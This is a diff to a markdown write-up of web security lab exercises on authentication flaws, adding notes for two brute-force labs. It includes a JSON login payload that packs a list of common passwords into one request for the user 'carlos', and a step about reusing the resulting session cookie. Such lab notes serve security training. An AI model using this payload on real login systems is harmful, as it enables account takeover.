@@ -49,4 +49,40 @@ To do this, you can use the script located in "scripts\create-user-pass.py".
 
 <img width="1080" height="500" src="IMG/3.png" />
 
-________
+
+### Lab: Username enumeration via account lock
+
+<p>This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.</p>
+
+### Lab: Broken brute-force protection, multiple credentials per request
+
+<p>This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.</p>
+
+```
+"username":"carlos",
+"password":[
+    "123456",
+    "password",
+    "12345678",
+    "qwerty",
+    "123456789",
+    "12345",
+    "1234",
+    "111111",
+    "1234567",
+    "dragon",
+    "123123",
+    "baseball",
+    "abc123",
+    "football"
+    ]
+}
+```
+
+<img width="1080" height="500" src="IMG/6.png" />
+
+After that, copy de session cookie and change on application to login.
+
+<img width="auto" height="500" src="IMG/7.png" />
+
+<img width="auto" height="500" src="IMG/8.png" />
